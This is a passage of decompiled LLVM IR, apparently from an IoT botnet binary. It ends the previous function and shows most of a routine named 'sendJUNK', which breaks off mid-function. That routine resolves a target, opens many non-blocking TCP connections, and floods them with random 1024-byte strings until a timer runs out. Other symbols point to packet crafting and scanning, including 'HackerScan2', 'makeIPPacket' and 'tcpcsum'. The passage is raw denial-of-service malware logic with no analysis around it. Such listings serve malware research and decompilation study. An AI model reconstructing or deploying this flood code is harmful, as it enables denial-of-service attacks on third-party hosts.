
dec_label_pc_804f5eb:                             ; preds = %dec_label_pc_804f50a
  %v4_804f5eb = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804f50a

dec_label_pc_804f5f3:                             ; preds = %dec_label_pc_804f5ce, %dec_label_pc_804f07c, %dec_label_pc_804f121, %dec_label_pc_804f0d2
  %v0_804f5fd = phi i32 [ %v5_804f08c, %dec_label_pc_804f07c ], [ %v4_804f131, %dec_label_pc_804f121 ], [ %v4_804f0e2, %dec_label_pc_804f0d2 ], [ %v2_804f5d5, %dec_label_pc_804f5ce ]
  store i32 %v0_804f03b, i32* @ebx, align 4
  store i32 %v0_804f03a, i32* @esi, align 4
  ret i32 %v0_804f5fd

; uselistorder directives
  uselistorder i32 %v3_804f5b7, { 1, 0 }
  uselistorder i32 %v0_804f595, { 1, 0 }
  uselistorder i32 %v1_804f571, { 1, 0 }
  uselistorder i32 %v1_804f555, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804f4fb, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f4f6, { 1, 0 }
  uselistorder i32 %v4_804f4e0, { 1, 0 }
  uselistorder i32 %v0_804f4be, { 1, 0 }
  uselistorder i32 %v4_804f4aa, { 2, 1, 0 }
  uselistorder i32 %v1_804f496, { 1, 0 }
  uselistorder i32 %v2_804f45f, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804f3ff, { 1, 0 }
  uselistorder i32 %v7_804f3fd, { 1, 0 }
  uselistorder i1 %v0_804f3ab, { 1, 0 }
  uselistorder i32 %v7_804f3a9, { 1, 0 }
  uselistorder i1 %v0_804f354, { 1, 0 }
  uselistorder i32 %v7_804f352, { 1, 0 }
  uselistorder i1 %v0_804f309, { 1, 0 }
  uselistorder i32 %v7_804f307, { 1, 0 }
  uselistorder i1 %v0_804f2c4, { 1, 0 }
  uselistorder i32 %v7_804f2c2, { 1, 0 }
  uselistorder i32 %v4_804f2a4, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.126, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.127, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804f427, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804f415, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804f24b, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804f235, { 1, 0 }
  uselistorder i32 %v7_804f233, { 1, 0 }
  uselistorder i32 %v2_804f1e2, { 1, 0 }
  uselistorder i32 %v1_804f19f, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804f187, { 14, 13, 11, 12, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 3, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 1, 2, 0 }
  uselistorder i32 %v1_804f163, { 1, 0, 2 }
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804f159, { 1, 0 }
  uselistorder i32 %v5_804f0c4, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804f06a, { 1, 0 }
  uselistorder i32 %v15_804f03c, { 1, 0 }
  uselistorder i8** %stack_var_-188, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 46, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 48, 47, 50, 49, 51, 52, 54, 53, 56, 55, 57, 58 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f5f3, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804f50a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f4a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f43e, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804f2a4, { 1, 0 }
  uselistorder label %dec_label_pc_804f160, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %dec_label_pc_804f07c, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f601 = load i32, i32* @edi, align 4
  %v0_804f602 = load i32, i32* @ebx, align 4
  store i32 %v0_804f602, i32* %stack_var_-12, align 4
  %v12_804f603 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804f603, i32* %eax.global-to-local, align 4
  %v1_804f611 = call i32 @getdtablesize(i32 %v12_804f603)
  store i32 %v1_804f611, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f611, 0
  %v2_804f61a = zext i1 %tmp to i32
  %v2_804f61d = add i32 %v2_804f61a, %v1_804f611
  %v2_804f61f = sdiv i32 %v2_804f61d, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804f62d = urem i32 %arg2, 65536
  store i32 %v1_804f62d, i32* %eax.global-to-local, align 4
  store i32 %v1_804f62d, i32* %stack_var_-236, align 4
  %v1_804f633 = trunc i32 %arg2 to i16
  %v2_804f633 = call i32 @htons(i16 %v1_804f633)
  %v2_804f63f = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-236, align 4
  %v3_804f64f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804f64f, i32* %eax.global-to-local, align 4
  %v1_804f654 = icmp eq i32 %v3_804f64f, 0
  br i1 %v1_804f654, label %dec_label_pc_804f65d, label %dec_label_pc_804f9d1

dec_label_pc_804f65d:                             ; preds = %entry
  %v2_804f673 = mul i32 %v2_804f61f, 8
  %v1_804f679 = add i32 %v2_804f673, 30
  %v2_804f67c = and i32 %v1_804f679, -16
  %v0_804f682 = load i32, i32* @esp, align 4
  %v2_804f682 = sub i32 %v0_804f682, %v2_804f67c
  %v1_804f694 = add i32 %v2_804f682, 35
  %v2_804f697 = and i32 %v1_804f694, -16
  %v2_804f6b4 = mul i32 %v2_804f61f, 5
  store i32 %v2_804f6b4, i32* %edx.global-to-local, align 4
  %v1_804f6ba = inttoptr i32 %v2_804f697 to i8*
  store i32 %v2_804f697, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804f6bf = and i32 %v1_804f694, -256
  store i32 %v1_804f6bf, i32* %eax.global-to-local, align 4
  %v5_804f6c1 = call i8* @_memset(i8* %v1_804f6ba, i32 %v1_804f6bf, i32 %v2_804f6b4)
  %v0_804f6c3 = load i32, i32* @esp, align 4
  %v1_804f6c3 = inttoptr i32 %v0_804f6c3 to i32*
  store i32 1024, i32* %v1_804f6c3, align 4
  %v1_804f6ca = call i32 @malloc(i32 %v2_804f697)
  store i32 %v1_804f6ca, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804f6dc = load i32, i32* @esp, align 4
  %v2_804f6dc = add i32 %v1_804f6dc, 8
  %v3_804f6dc = inttoptr i32 %v2_804f6dc to i32*
  store i32 1024, i32* %v3_804f6dc, align 4
  %v0_804f6e0 = load i32, i32* @esp, align 4
  %v1_804f6e0 = add i32 %v0_804f6e0, 4
  %v2_804f6e0 = inttoptr i32 %v1_804f6e0 to i32*
  store i32 0, i32* %v2_804f6e0, align 4
  %v0_804f6e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f6e8 = load i32, i32* @esp, align 4
  %v2_804f6e8 = inttoptr i32 %v1_804f6e8 to i32*
  store i32 %v0_804f6e8, i32* %v2_804f6e8, align 4
  %v3_804f6eb = inttoptr i32 %v1_804f6ca to i8*
  %v4_804f6eb = call i32 @__GI_memset(i8* %v3_804f6eb, i32 %tmp7, i32 %tmp4)
  store i32 %v4_804f6eb, i32* %eax.global-to-local, align 4
  %v0_804f6f0 = load i32, i32* @esp, align 4
  %v1_804f6f0 = inttoptr i32 %v0_804f6f0 to i32*
  store i32 0, i32* %v1_804f6f0, align 4
  %v1_804f6f7 = inttoptr i32 %v1_804f6ca to i32*
  %v2_804f6f7 = call i32 @__GI_time(i32* %v1_804f6f7)
  %v5_804f6fc = add i32 %v2_804f6f7, %arg3
  store i32 %v5_804f6fc, i32* %eax.global-to-local, align 4
  %v3_804f719 = or i32 %v2_804f697, 4
  %v2_804f81d = ptrtoint i32* %stack_var_-188 to i32
  %tmp31 = bitcast i32* %stack_var_-188 to i8*
  %v2_804f86e = ptrtoint i32* %stack_var_-196 to i32
  %v2_804f8b6 = ptrtoint i32* %stack_var_-200 to i32
  %v2_804f8c0 = ptrtoint i32* %stack_var_-204 to i32
  %v16_804f9b338 = icmp sgt i32 %v2_804f61d, 1
  br label %dec_label_pc_804f9bc

dec_label_pc_804f713:                             ; preds = %dec_label_pc_804f9b0.preheader, %dec_label_pc_804f9ad
  %storemerge41 = phi i32 [ %v4_804f9ad, %dec_label_pc_804f9ad ], [ 0, %dec_label_pc_804f9b0.preheader ]
  %stack_var_-192.140 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804f9ad ], [ %stack_var_-192.2, %dec_label_pc_804f9b0.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f697, i32* %edx.global-to-local, align 4
  %v2_804f719 = mul i32 %storemerge41, 8
  %v4_804f719 = add i32 %v2_804f719, %v3_804f719
  %v5_804f719 = inttoptr i32 %v4_804f719 to i8*
  %v6_804f719 = load i8, i8* %v5_804f719, align 4
  %v7_804f719 = zext i8 %v6_804f719 to i32
  store i32 %v7_804f719, i32* %eax.global-to-local, align 4
  %v8_804f727 = icmp eq i8 %v6_804f719, 0
  %v12_804f727 = icmp eq i8 %v6_804f719, 1
  br i1 %v12_804f727, label %dec_label_pc_804f813, label %dec_label_pc_804f734

dec_label_pc_804f734:                             ; preds = %dec_label_pc_804f713
  %v12_804f734 = icmp eq i8 %v6_804f719, 2
  br i1 %v12_804f734, label %dec_label_pc_804f945, label %dec_label_pc_804f741

dec_label_pc_804f741:                             ; preds = %dec_label_pc_804f734
  br i1 %v8_804f727, label %dec_label_pc_804f74f, label %dec_label_pc_804f9ad

dec_label_pc_804f74f:                             ; preds = %dec_label_pc_804f741
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804f752 = load i32, i32* @esp, align 4
  %v1_804f752 = add i32 %v0_804f752, 8
  %v2_804f752 = inttoptr i32 %v1_804f752 to i32*
  store i32 0, i32* %v2_804f752, align 4
  %v0_804f75a = load i32, i32* @esp, align 4
  %v1_804f75a = add i32 %v0_804f75a, 4
  %v2_804f75a = inttoptr i32 %v1_804f75a to i32*
  store i32 1, i32* %v2_804f75a, align 4
  %v0_804f762 = load i32, i32* @esp, align 4
  %v1_804f762 = inttoptr i32 %v0_804f762 to i32*
  store i32 2, i32* %v1_804f762, align 4
  %v2_804f769 = load i32, i32* %stack_var_-204, align 4
  %v3_804f769 = call i32 @socket(i32 %v7_804f719, i32 %v12_804f603, i32 %v2_804f769)
  %v2_804f773 = load i32, i32* @ebx, align 4
  %v3_804f773 = mul i32 %v2_804f773, 8
  %v4_804f773 = add i32 %v3_804f773, %v2_804f697
  %v5_804f773 = inttoptr i32 %v4_804f773 to i32*
  store i32 %v3_804f769, i32* %v5_804f773, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v3_804f77c = add i32 %v2_804f719, %v2_804f697
  %v4_804f77c = inttoptr i32 %v3_804f77c to i32*
  %v5_804f77c = load i32, i32* %v4_804f77c, align 8
  store i32 %v5_804f77c, i32* %eax.global-to-local, align 4
  %v0_804f77f = load i32, i32* @esp, align 4
  %v1_804f77f = add i32 %v0_804f77f, 8
  %v2_804f77f = inttoptr i32 %v1_804f77f to i32*
  store i32 0, i32* %v2_804f77f, align 4
  %v0_804f787 = load i32, i32* @esp, align 4
  %v1_804f787 = add i32 %v0_804f787, 4
  %v2_804f787 = inttoptr i32 %v1_804f787 to i32*
  store i32 3, i32* %v2_804f787, align 4
  %v0_804f78f = load i32, i32* %eax.global-to-local, align 4
  %v1_804f78f = load i32, i32* @esp, align 4
  %v2_804f78f = inttoptr i32 %v1_804f78f to i32*
  store i32 %v0_804f78f, i32* %v2_804f78f, align 4
  %v2_804f792 = load i32, i32* %stack_var_-204, align 4
  %v3_804f792 = call i32 @__libc_fcntl(i32 %v7_804f719, i32 %v12_804f603, i32 %v2_804f792)
  %v1_804f799 = or i32 %v3_804f792, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f7a5 = load i32, i32* %v4_804f77c, align 8
  store i32 %v5_804f7a5, i32* %eax.global-to-local, align 4
  %v1_804f7a8 = load i32, i32* @esp, align 4
  %v2_804f7a8 = add i32 %v1_804f7a8, 8
  %v3_804f7a8 = inttoptr i32 %v2_804f7a8 to i32*
  store i32 %v1_804f799, i32* %v3_804f7a8, align 4
  %v0_804f7ac = load i32, i32* @esp, align 4
  %v1_804f7ac = add i32 %v0_804f7ac, 4
  %v2_804f7ac = inttoptr i32 %v1_804f7ac to i32*
  store i32 4, i32* %v2_804f7ac, align 4
  %v0_804f7b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7b4 = load i32, i32* @esp, align 4
  %v2_804f7b4 = inttoptr i32 %v1_804f7b4 to i32*
  store i32 %v0_804f7b4, i32* %v2_804f7b4, align 4
  %v2_804f7b7 = load i32, i32* %stack_var_-204, align 4
  %v3_804f7b7 = call i32 @__libc_fcntl(i32 %v7_804f719, i32 %v12_804f603, i32 %v2_804f7b7)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f7c5 = load i32, i32* %v4_804f77c, align 8
  store i32 %v5_804f7c5, i32* %eax.global-to-local, align 4
  %v0_804f7c8 = load i32, i32* @esp, align 4
  %v1_804f7c8 = add i32 %v0_804f7c8, 8
  %v2_804f7c8 = inttoptr i32 %v1_804f7c8 to i32*
  store i32 16, i32* %v2_804f7c8, align 4
  %v1_804f7d0 = load i32, i32* @esp, align 4
  %v2_804f7d0 = add i32 %v1_804f7d0, 4
  %v3_804f7d0 = inttoptr i32 %v2_804f7d0 to i32*
  store i32 %v2_804f63f, i32* %v3_804f7d0, align 4
  %v0_804f7d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7d4 = load i32, i32* @esp, align 4
  %v2_804f7d4 = inttoptr i32 %v1_804f7d4 to i32*
  store i32 %v0_804f7d4, i32* %v2_804f7d4, align 4
  %v2_804f7d7 = load i32, i32* %stack_var_-204, align 4
  %v3_804f7d7 = call i32 @__libc_connect(i32 %v7_804f719, i32 %v12_804f603, i32 %v2_804f7d7)
  store i32 %v3_804f7d7, i32* %eax.global-to-local, align 4
  %v10_804f7dc = icmp eq i32 %v3_804f7d7, -1
  %v1_804f7df = icmp eq i1 %v10_804f7dc, false
  br i1 %v1_804f7df, label %dec_label_pc_804f7ed, label %dec_label_pc_804f7e1

dec_label_pc_804f7e1:                             ; preds = %dec_label_pc_804f74f
  %v1_804f7e1 = call i32 @__errno_location(i32 %v7_804f719)
  store i32 %v1_804f7e1, i32* %eax.global-to-local, align 4
  %v1_804f7e6 = inttoptr i32 %v1_804f7e1 to i32*
  %v2_804f7e6 = load i32, i32* %v1_804f7e6, align 4
  store i32 %v2_804f7e6, i32* %eax.global-to-local, align 4
  %v9_804f7e8 = icmp eq i32 %v2_804f7e6, 115
  br i1 %v9_804f7e8, label %dec_label_pc_804f803, label %dec_label_pc_804f7ed

dec_label_pc_804f7ed:                             ; preds = %dec_label_pc_804f7e1, %dec_label_pc_804f74f
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f697, i32* %edx.global-to-local, align 4
  %v5_804f7f3 = load i32, i32* %v4_804f77c, align 8
  store i32 %v5_804f7f3, i32* %eax.global-to-local, align 4
  %v1_804f7f6 = load i32, i32* @esp, align 4
  %v2_804f7f6 = inttoptr i32 %v1_804f7f6 to i32*
  store i32 %v5_804f7f3, i32* %v2_804f7f6, align 4
  %v1_804f7f9 = call i32 @__libc_close(i32 %v7_804f719)
  store i32 %v1_804f7f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f803:                             ; preds = %dec_label_pc_804f7e1
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804f719, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f813:                             ; preds = %dec_label_pc_804f713
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f81d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f824 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v3_804f832 = add i32 %v2_804f719, %v2_804f697
  %v4_804f832 = inttoptr i32 %v3_804f832 to i32*
  %v5_804f832 = load i32, i32* %v4_804f832, align 8
  %v2_804f837 = udiv i32 %v5_804f832, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f840 = load i32, i32* %v4_804f832, align 8
  %v1_804f843 = urem i32 %v5_804f840, 32
  store i32 %v1_804f843, i32* %eax.global-to-local, align 4
  %v0_804f846 = load i32, i32* @ebp, align 4
  %v2_804f846 = mul nuw nsw i32 %v2_804f837, 4
  %v3_804f846 = add nsw i32 %v2_804f846, -184
  %v4_804f846 = add i32 %v3_804f846, %v0_804f846
  %v5_804f846 = inttoptr i32 %v4_804f846 to i32*
  %v6_804f846 = load i32, i32* %v5_804f846, align 4
  %v9_804f846 = shl i32 1, %v1_804f843
  %v12_804f846 = or i32 %v6_804f846, %v9_804f846
  store i32 %v12_804f846, i32* %v5_804f846, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f868 = load i32, i32* %v4_804f832, align 8
  %v1_804f86b = add i32 %v5_804f868, 1
  store i32 %v1_804f86b, i32* %edx.global-to-local, align 4
  %v1_804f874 = load i32, i32* @esp, align 4
  %v2_804f874 = add i32 %v1_804f874, 16
  %v3_804f874 = inttoptr i32 %v2_804f874 to i32*
  store i32 %v2_804f86e, i32* %v3_804f874, align 4
  %v0_804f878 = load i32, i32* @esp, align 4
  %v1_804f878 = add i32 %v0_804f878, 12
  %v2_804f878 = inttoptr i32 %v1_804f878 to i32*
  store i32 0, i32* %v2_804f878, align 4
  store i32 %v2_804f81d, i32* %eax.global-to-local, align 4
  %v1_804f886 = load i32, i32* @esp, align 4
  %v2_804f886 = add i32 %v1_804f886, 8
  %v3_804f886 = inttoptr i32 %v2_804f886 to i32*
  store i32 %v2_804f81d, i32* %v3_804f886, align 4
  %v0_804f88a = load i32, i32* @esp, align 4
  %v1_804f88a = add i32 %v0_804f88a, 4
  %v2_804f88a = inttoptr i32 %v1_804f88a to i32*
  store i32 0, i32* %v2_804f88a, align 4
  %v0_804f892 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f892 = load i32, i32* @esp, align 4
  %v2_804f892 = inttoptr i32 %v1_804f892 to i32*
  store i32 %v0_804f892, i32* %v2_804f892, align 4
  %v0_804f895 = load i32, i32* %stack_var_-196, align 4
  %v2_804f895 = load i32, i32* %stack_var_-188, align 4
  %v5_804f895 = call i32 @__libc_select(i32 %v0_804f895, i32 10000, i32 %v2_804f895, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f895, i32* %eax.global-to-local, align 4
  %v12_804f89d = icmp eq i32 %v5_804f895, 1
  %v1_804f8a1 = icmp eq i1 %v12_804f89d, false
  br i1 %v1_804f8a1, label %dec_label_pc_804f91d, label %dec_label_pc_804f8a3

dec_label_pc_804f8a3:                             ; preds = %dec_label_pc_804f813
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f8b3 = load i32, i32* %v4_804f832, align 8
  store i32 %v5_804f8b3, i32* %edx.global-to-local, align 4
  %v1_804f8bc = load i32, i32* @esp, align 4
  %v2_804f8bc = add i32 %v1_804f8bc, 16
  %v3_804f8bc = inttoptr i32 %v2_804f8bc to i32*
  store i32 %v2_804f8b6, i32* %v3_804f8bc, align 4
  store i32 %v2_804f8c0, i32* %eax.global-to-local, align 4
  %v1_804f8c6 = load i32, i32* @esp, align 4
  %v2_804f8c6 = add i32 %v1_804f8c6, 12
  %v3_804f8c6 = inttoptr i32 %v2_804f8c6 to i32*
  store i32 %v2_804f8c0, i32* %v3_804f8c6, align 4
  %v0_804f8ca = load i32, i32* @esp, align 4
  %v1_804f8ca = add i32 %v0_804f8ca, 8
  %v2_804f8ca = inttoptr i32 %v1_804f8ca to i32*
  store i32 4, i32* %v2_804f8ca, align 4
  %v0_804f8d2 = load i32, i32* @esp, align 4
  %v1_804f8d2 = add i32 %v0_804f8d2, 4
  %v2_804f8d2 = inttoptr i32 %v1_804f8d2 to i32*
  store i32 1, i32* %v2_804f8d2, align 4
  %v0_804f8da = load i32, i32* %edx.global-to-local, align 4
  %v1_804f8da = load i32, i32* @esp, align 4
  %v2_804f8da = inttoptr i32 %v1_804f8da to i32*
  store i32 %v0_804f8da, i32* %v2_804f8da, align 4
  %v0_804f8dd = load i32, i32* %stack_var_-200, align 4
  %v1_804f8dd = load i32, i32* %stack_var_-196, align 4
  %v3_804f8dd = load i32, i32* %stack_var_-188, align 4
  %v5_804f8dd = call i32 @getsockopt(i32 %v0_804f8dd, i32 %v1_804f8dd, i32 10000, i32 %v3_804f8dd, i32 ptrtoint (i32* @0 to i32))
  %v3_804f8e2 = load i32, i32* %stack_var_-204, align 4
  %v1_804f8e8 = icmp eq i32 %v3_804f8e2, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  br i1 %v1_804f8e8, label %dec_label_pc_804f90d, label %dec_label_pc_804f8ec

dec_label_pc_804f8ec:                             ; preds = %dec_label_pc_804f8a3
  %v5_804f8f2 = load i32, i32* %v4_804f832, align 8
  store i32 %v5_804f8f2, i32* %eax.global-to-local, align 4
  %v1_804f8f5 = load i32, i32* @esp, align 4
  %v2_804f8f5 = inttoptr i32 %v1_804f8f5 to i32*
  store i32 %v5_804f8f2, i32* %v2_804f8f5, align 4
  %v0_804f8f8 = load i32, i32* %stack_var_-200, align 4
  %v1_804f8f8 = call i32 @__libc_close(i32 %v0_804f8f8)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f719, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f90d:                             ; preds = %dec_label_pc_804f8a3
  store i8 2, i8* %v5_804f719, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f91d:                             ; preds = %dec_label_pc_804f813
  %v13_804f91d = icmp eq i32 %v5_804f895, -1
  %v1_804f921 = icmp eq i1 %v13_804f91d, false
  br i1 %v1_804f921, label %dec_label_pc_804f9ad, label %dec_label_pc_804f927

dec_label_pc_804f927:                             ; preds = %dec_label_pc_804f91d
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v5_804f92d = load i32, i32* %v4_804f832, align 8
  store i32 %v5_804f92d, i32* %eax.global-to-local, align 4
  %v1_804f930 = load i32, i32* @esp, align 4
  %v2_804f930 = inttoptr i32 %v1_804f930 to i32*
  store i32 %v5_804f92d, i32* %v2_804f930, align 4
  %v1_804f933 = call i32 @__libc_close(i32 %v5_804f895)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f719, align 4
  br label %dec_label_pc_804f9ad

dec_label_pc_804f945:                             ; preds = %dec_label_pc_804f734
  %v0_804f945 = load i32, i32* @esp, align 4
  %v1_804f945 = add i32 %v0_804f945, 4
  %v2_804f945 = inttoptr i32 %v1_804f945 to i32*
  store i32 1024, i32* %v2_804f945, align 4
  store i32 %v1_804f6ca, i32* %eax.global-to-local, align 4
  %v1_804f950 = load i32, i32* @esp, align 4
  %v2_804f950 = inttoptr i32 %v1_804f950 to i32*
  store i32 %v1_804f6ca, i32* %v2_804f950, align 4
  %v2_804f953 = inttoptr i32 %v7_804f719 to i8*
  %v3_804f953 = call i32 @makeRandomStr(i8* %v2_804f953, i32 %v12_804f603)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f697, i32* %eax.global-to-local, align 4
  %v3_804f95e = add i32 %v2_804f719, %v2_804f697
  %v4_804f95e = inttoptr i32 %v3_804f95e to i32*
  %v5_804f95e = load i32, i32* %v4_804f95e, align 8
  store i32 %v5_804f95e, i32* %edx.global-to-local, align 4
  %v0_804f961 = load i32, i32* @esp, align 4
  %v1_804f961 = add i32 %v0_804f961, 12
  %v2_804f961 = inttoptr i32 %v1_804f961 to i32*
  store i32 16384, i32* %v2_804f961, align 4
  %v0_804f969 = load i32, i32* @esp, align 4
  %v1_804f969 = add i32 %v0_804f969, 8
  %v2_804f969 = inttoptr i32 %v1_804f969 to i32*
  store i32 1024, i32* %v2_804f969, align 4
  store i32 %v1_804f6ca, i32* %eax.global-to-local, align 4
  %v1_804f974 = load i32, i32* @esp, align 4
  %v2_804f974 = add i32 %v1_804f974, 4
  %v3_804f974 = inttoptr i32 %v2_804f974 to i32*
  store i32 %v1_804f6ca, i32* %v3_804f974, align 4
  %v0_804f978 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f978 = load i32, i32* @esp, align 4
  %v2_804f978 = inttoptr i32 %v1_804f978 to i32*
  store i32 %v0_804f978, i32* %v2_804f978, align 4
  %v0_804f97b = load i32, i32* %stack_var_-200, align 4
  %v1_804f97b = load i32, i32* %stack_var_-196, align 4
  %v3_804f97b = load i32, i32* %stack_var_-188, align 4
  %v4_804f97b = call i32 @__libc_send(i32 %v0_804f97b, i32 %v1_804f97b, i32 %stack_var_-192.140, i32 %v3_804f97b)
  store i32 %v4_804f97b, i32* %eax.global-to-local, align 4
  %v10_804f980 = icmp eq i32 %v4_804f97b, -1
  %v1_804f983 = icmp eq i1 %v10_804f980, false
  br i1 %v1_804f983, label %dec_label_pc_804f9ad, label %dec_label_pc_804f985

dec_label_pc_804f985:                             ; preds = %dec_label_pc_804f945
  %v0_804f985 = load i32, i32* %stack_var_-200, align 4
  %v1_804f985 = call i32 @__errno_location(i32 %v0_804f985)
  store i32 %v1_804f985, i32* %eax.global-to-local, align 4
